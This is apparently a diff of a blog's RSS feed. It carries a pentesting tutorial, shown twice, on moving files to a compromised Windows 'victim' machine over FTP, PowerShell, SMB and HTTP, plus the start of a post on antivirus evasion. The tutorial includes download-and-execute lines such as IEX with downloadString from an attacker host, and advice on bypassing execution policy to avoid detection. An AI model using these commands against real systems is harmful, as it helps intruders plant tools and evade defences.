+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;webclient &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; New&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Object&lt;/span&gt; System&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Net&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;WebClient &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;wget&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ps1  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://&amp;lt;YOUR IP&amp;gt;/&amp;lt;PATH TO FILE&amp;gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;wget&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ps1  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;output-file.exe&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;wget&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ps1  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;webclient&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DownloadFile(&lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;url,&lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;file) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;wget&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ps1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To invoke&lt;code&gt;wget.ps1&lt;/code&gt;, call&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-ExecutionPolicy Bypass -noLogo -NonInteractive --- stealthly
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(new-object System.Net.WebClient).DownloadFile(&amp;#39;http://&amp;lt;YOUR IP&amp;gt;/&amp;lt;FILENAME&amp;gt;&amp;#39;)&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IEX(New&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Object&lt;/span&gt; Net&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;WebClient)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;downloadString(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://&amp;lt;YOUR IP&amp;gt;/&amp;lt;FILENAME&amp;gt;&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;getting-files-through-powershell&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*nBHrLvu-D9RNlMsbTG3Wsg.jpeg&#34; alt=&#34;&#34;  /&gt;
+
+Getting Files Through PowerShell&lt;/h1&gt;
+&lt;p&gt;On your Kali Linux machine, make a copy of the file you want to send to &lt;code&gt;/var/www/html/&lt;/code&gt; . On the Window’s machine, execute the following:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(new-object System.Net.WebClient).DownloadFile(&amp;#39;http://192.168.10.128/unko.txt&amp;#39;,&amp;#39;C:\Users\Administrator\Desktop&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ransferme.txt&amp;#39;)&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(new-object System.Net.WebClient).DownloadFile(&amp;#39;http://192.168.119.146/gori.ps1&amp;#39;)&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;file-transfer-withsmb&#34;&gt;File Transfer With SMB&lt;/h1&gt;
+&lt;h2 id=&#34;method-1&#34;&gt;Method 1&lt;/h2&gt;
+&lt;p&gt;Get &lt;code&gt;smbserver.py&lt;/code&gt;from &lt;a href=&#34;https://github.com/SecureAuthCorp/impacket&#34;&gt;Impacket&lt;/a&gt; and run the following on your Kali Linux machine:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smbserver.py gori $(pwd) -smb2support -user gori -pass gorigori
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Run this on the victim’s machine:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;New-PSDrive -Name &amp;#34;gori&amp;#34; -PSProvider &amp;#34;FileSystem&amp;#34; -gori &amp;#34;\\&amp;lt;YOUR IP&amp;gt;\gori&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;method-2&#34;&gt;Method 2&lt;/h2&gt;
+&lt;p&gt;Run this on your Kali machine:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smbserver.py kali .
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Run this on the victim’s machine:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;On victim&amp;#39;s \\&amp;lt;YOUR IP ADDRESS&amp;gt;\kali\FILE\_NAME.exe &amp;#34;whoami&amp;#34; # &amp;#34;whoami&amp;#34; confirms that it is running
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;file-transfer-with-an-httpserver&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*i6K6JFM5TTxSFf4b_ermuQ.png&#34; alt=&#34;&#34;  /&gt;
+
+File Transfer With an HTTP Server&lt;/h1&gt;
+&lt;p&gt;On your machine run:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 -m http.server 80
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This will start an HTTP server on port 80 with the root of the HTTP server being in the directory that you executed the command from. To get a file, run this on the victim’s machine:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget http://&amp;lt;YOUR IP&amp;gt;/path/to/file.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;file-transfer-with-scp-andrsync&#34;&gt;File Transfer with SCP and RSYNC&lt;/h1&gt;
+&lt;p&gt;Both of these methods of file transfer occur over SSH. Secure Copy Protocol (SCP) is being deprecated, however, if you’re able to use it, the syntax is fairly simple.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;scp &amp;lt;SOURCE&amp;gt; &amp;lt;DESTINATION&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In this example, we are using SCP to copy a file from a remote host to the working directory of our local machine such that our computer is on the receiving end.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;scp username@ip_address:/home/username/filename
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If you are looking to transfer a file from your computer to the remote host, the following syntax can be used:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;scp filename username@ip_address:/home/username
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The same commands can be used with RYSNC by simply replacing &lt;code&gt;scp&lt;/code&gt; with &lt;code&gt;rsync&lt;/code&gt; .&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rsync &amp;lt;SOURCE&amp;gt; &amp;lt;DESTINATION&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;There are countless ways to transfer files between two computers. Among the most common methods are HTTP and FTP, but if those don’t work, there is a chance that some of the other options here will. Some honorable mentions that I didn’t go into detail on are SSHFS, SFTP, Winscp, and Samba. I hope that you were able to find value in this article and remember to never stop learning.&lt;/p&gt;
+</description>
+      <content:encoded><![CDATA[<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*HNC0lT4gPMDU8uH0fyjRyw.png" alt=""  />
+</p>
+<h1 id="foreword">Foreword</h1>
+<p>To avoid detection, it is best to use tools that are native to the victim’s computer.</p>
+<h1 id="ftp-with-windowshost">FTP with Windows Host</h1>
+<p>While having a shell on the Windows machine, start an FTP server on your host machine. Follow these steps if you don’t already have FTP server installed:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo apt-get install vsftpd  
+</span></span><span style="display:flex;"><span>sudo service vsftpd start  
+</span></span><span style="display:flex;"><span>service vsftpd status #status should be active
+</span></span></code></pre></div><p>To check if your server is working, type <code>ftp localhost.</code> If you see the message “Connected to localhost”, your FTP server is running.</p>
+<h2 id="accessing-file-with-interactive-shell"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*ehYiaPXjraslOYhNqIv7Zw.png" alt=""  />
+
+Accessing File With Interactive Shell</h2>
+<p>If you have an interactive shell on the Windows machine, run this command.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>cscript wget.vbs http://&lt;YOUR IP&gt;/&lt;PATH TO FILE&gt; &lt;FILENAME TO SAVE AS&gt;
+</span></span></code></pre></div><h2 id="accessing-file-with-non-interactive-shell">Accessing File With Non-Interactive Shell</h2>
+<p>If you don’t have an interactive shell, you can’t start PowerShell.exe. A workaround is to create a PowerShell script and execute it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>echo <span style="color:#f92672">$</span>storageDir <span style="color:#f92672">=</span> <span style="color:#f92672">$</span>pwd <span style="color:#f92672">&gt;</span> wget<span style="color:#f92672">.</span>ps1  
+</span></span><span style="display:flex;"><span>echo <span style="color:#f92672">$</span>webclient <span style="color:#f92672">=</span> New<span style="color:#f92672">-</span><span style="color:#a6e22e">Object</span> System<span style="color:#f92672">.</span>Net<span style="color:#f92672">.</span>WebClient <span style="color:#f92672">&gt;&gt;</span>wget<span style="color:#f92672">.</span>ps1  
+</span></span><span style="display:flex;"><span>echo <span style="color:#f92672">$</span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://&lt;YOUR IP&gt;/&lt;PATH TO FILE&gt;&#34;</span> <span style="color:#f92672">&gt;&gt;</span>wget<span style="color:#f92672">.</span>ps1  
+</span></span><span style="display:flex;"><span>echo <span style="color:#f92672">$</span>file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;output-file.exe&#34;</span> <span style="color:#f92672">&gt;&gt;</span>wget<span style="color:#f92672">.</span>ps1  
+</span></span><span style="display:flex;"><span>echo <span style="color:#f92672">$</span>webclient<span style="color:#f92672">.</span>DownloadFile(<span style="color:#f92672">$</span>url,<span style="color:#f92672">$</span>file) <span style="color:#f92672">&gt;&gt;</span>wget<span style="color:#f92672">.</span>ps1
+</span></span></code></pre></div><p>To invoke<code>wget.ps1</code>, call</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>-ExecutionPolicy Bypass -noLogo -NonInteractive --- stealthly
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>powershell <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;(new-object System.Net.WebClient).DownloadFile(&#39;http://&lt;YOUR IP&gt;/&lt;FILENAME&gt;&#39;)&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>IEX(New<span style="color:#f92672">-</span><span style="color:#a6e22e">Object</span> Net<span style="color:#f92672">.</span>WebClient)<span style="color:#f92672">.</span>downloadString(<span style="color:#e6db74">&#39;http://&lt;YOUR IP&gt;/&lt;FILENAME&gt;&#39;</span>)
+</span></span></code></pre></div><h1 id="getting-files-through-powershell"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*nBHrLvu-D9RNlMsbTG3Wsg.jpeg" alt=""  />
+
+Getting Files Through PowerShell</h1>
+<p>On your Kali Linux machine, make a copy of the file you want to send to <code>/var/www/html/</code> . On the Window’s machine, execute the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>powershell <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;(new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.10.128/unko.txt&#39;,&#39;C:\Users\Administrator\Desktop</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">ransferme.txt&#39;)&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>powershell <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;(new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.119.146/gori.ps1&#39;)&#34;</span>
+</span></span></code></pre></div><h1 id="file-transfer-withsmb">File Transfer With SMB</h1>
+<h2 id="method-1">Method 1</h2>
+<p>Get <code>smbserver.py</code>from <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> and run the following on your Kali Linux machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>smbserver.py gori $(pwd) -smb2support -user gori -pass gorigori
+</span></span></code></pre></div><p>Run this on the victim’s machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>New-PSDrive -Name &#34;gori&#34; -PSProvider &#34;FileSystem&#34; -gori &#34;\\&lt;YOUR IP&gt;\gori&#34;
+</span></span></code></pre></div><h2 id="method-2">Method 2</h2>
+<p>Run this on your Kali machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>smbserver.py kali .
+</span></span></code></pre></div><p>Run this on the victim’s machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>On victim&#39;s \\&lt;YOUR IP ADDRESS&gt;\kali\FILE\_NAME.exe &#34;whoami&#34; # &#34;whoami&#34; confirms that it is running
+</span></span></code></pre></div><h1 id="file-transfer-with-an-httpserver"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*i6K6JFM5TTxSFf4b_ermuQ.png" alt=""  />
+
+File Transfer With an HTTP Server</h1>
+<p>On your machine run:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python3 -m http.server 80
+</span></span></code></pre></div><p>This will start an HTTP server on port 80 with the root of the HTTP server being in the directory that you executed the command from. To get a file, run this on the victim’s machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>wget http://&lt;YOUR IP&gt;/path/to/file.txt
+</span></span></code></pre></div><h1 id="file-transfer-with-scp-andrsync">File Transfer with SCP and RSYNC</h1>
+<p>Both of these methods of file transfer occur over SSH. Secure Copy Protocol (SCP) is being deprecated, however, if you’re able to use it, the syntax is fairly simple.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>scp &lt;SOURCE&gt; &lt;DESTINATION&gt;
+</span></span></code></pre></div><p>In this example, we are using SCP to copy a file from a remote host to the working directory of our local machine such that our computer is on the receiving end.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>scp username@ip_address:/home/username/filename
+</span></span></code></pre></div><p>If you are looking to transfer a file from your computer to the remote host, the following syntax can be used:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>scp filename username@ip_address:/home/username
+</span></span></code></pre></div><p>The same commands can be used with RYSNC by simply replacing <code>scp</code> with <code>rsync</code> .</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>rsync &lt;SOURCE&gt; &lt;DESTINATION&gt;
+</span></span></code></pre></div><h1 id="conclusion">Conclusion</h1>
+<p>There are countless ways to transfer files between two computers. Among the most common methods are HTTP and FTP, but if those don’t work, there is a chance that some of the other options here will. Some honorable mentions that I didn’t go into detail on are SSHFS, SFTP, Winscp, and Samba. I hope that you were able to find value in this article and remember to never stop learning.</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Antivirus Evasion: What it is and How to do it</title>
+      <link>http://localhost:1313/ally-petitt/en/posts/2022-05-30_antivirus-evasion--what-it-is-and-how-to-do-it-17f98e920704/</link>
+      <pubDate>Mon, 30 May 2022 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/ally-petitt/en/posts/2022-05-30_antivirus-evasion--what-it-is-and-how-to-do-it-17f98e920704/</guid>
+      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*W1qjqIKKNMK9_QYWXGQzRw.png&#34; alt=&#34;picture of a bug&#34;  /&gt;
+&lt;/p&gt;
+&lt;h1 id=&#34;how-does-antivirus-software-actuallywork&#34;&gt;How Does Antivirus Software Actually Work?&lt;/h1&gt;
+&lt;p&gt;Antivirus software acts as a defense from trojans, viruses, ransomware, spyware, adware, and much more. There are 3 main ways that it detects malware: signature-based detection, heuristic-based detection, and anomaly-based detection.&lt;/p&gt;
+&lt;h2 id=&#34;signature-based-detection&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*ehROjARifrRnkEITjkFwMw.png&#34; alt=&#34;&#34;  /&gt;
+
+Signature-Based Detection&lt;/h2&gt;
+&lt;p&gt;The scanner will search for specific strings in a program and check for them in a database of known viruses. The strings are often the payload of the malicious code. If the signatures match, the activity is flagged for suspicious activity. Many of these databases store over 250,000 different signatures.&lt;/p&gt;
+&lt;p&gt;Downsides to this approach:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;The database only stores the values of known signatures&lt;/li&gt;
+&lt;li&gt;Newer variations of malware may go undetected if their new signature is not stored in the database&lt;/li&gt;
+&lt;li&gt;Viruses can be easily and quickly altered to change their signature&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;anomaly-based-detection&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*8jt-Qw_ai_h_GCSJV15fuQ.png&#34; alt=&#34;&#34;  /&gt;
+
+Anomaly-Based Detection&lt;/h2&gt;
+&lt;p&gt;Instead of referencing a static database that needs to be continuously updated, this type of detection checks the running program for patterns of . This can be referred to as an expert system. Often, these detection systems will utilize a &lt;strong&gt;machine learning model&lt;/strong&gt; that was trained using data from the past years of the company using the antivirus software.&lt;/p&gt;
+&lt;h2 id=&#34;heuristic-based-detection&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*meCStYsucAG7XXY88Lnj0w.jpeg&#34; alt=&#34;&#34;  /&gt;
+
+Heuristic-Based Detection&lt;/h2&gt;
+&lt;p&gt;This is one of the few methods capable of detecting polymorphic viruses. Heuristic analysis may consist of multiple different methods, including static heuristic analysis. This technique deals with decompiling a program and comparing the source code to the source code of known viruses stored in a database.&lt;/p&gt;
+&lt;p&gt;Additionally, heuristic analysis may include dynamic heuristics, a method of containing the program in a virtual machine to test what happens when the code is executed. The running program is monitored for suspicious activity such as overwriting files or self-replication.&lt;/p&gt;
+&lt;h1 id=&#34;how-to-evade-antivirus-detection&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*VY6GEFR7NyUkIPcXNT49bg.jpeg&#34; alt=&#34;&#34;  /&gt;
+
+How to Evade Antivirus Detection&lt;/h1&gt;
+&lt;h2 id=&#34;on-disk-evasion&#34;&gt;&lt;strong&gt;On-Disk Evasion&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;The following are techniques used for on-disk evasion:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Obfuscation&lt;/strong&gt;- this method involves rewriting the code to appear more confusing and harder to read.&lt;/li&gt;
